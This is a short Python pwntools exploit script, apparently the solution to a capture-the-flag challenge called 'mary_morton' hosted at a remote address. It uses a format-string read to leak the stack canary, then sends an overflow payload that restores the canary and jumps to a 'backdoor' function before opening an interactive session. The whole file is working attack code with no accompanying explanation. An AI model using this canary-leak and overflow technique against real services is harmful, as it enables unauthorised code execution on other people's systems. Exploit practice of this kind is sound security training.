from pwn import *
context.log_level =  'debug'
#sh=process('./mary_morton')
sh=remote('111.198.29.45','32543')


sh.recvuntil('battle \n')
#sh.recv()
sh.sendline('2')
sleep(0.1)
fmt = '%23$lx'
sh.sendline(fmt)
canary =int('0x'+sh.recv(16),16)
print 'canary: '+hex(canary)
sh.recvuntil('battle \n')
sh.sendline('1')
sleep(0.1)
backdoor = 0x4008da
pay = 'a'*0x88 + p64(canary) + 'bbbbbbbb' +p64(backdoor)
sh.sendline(pay)



#gdb.attach(sh)
sh.interactive()
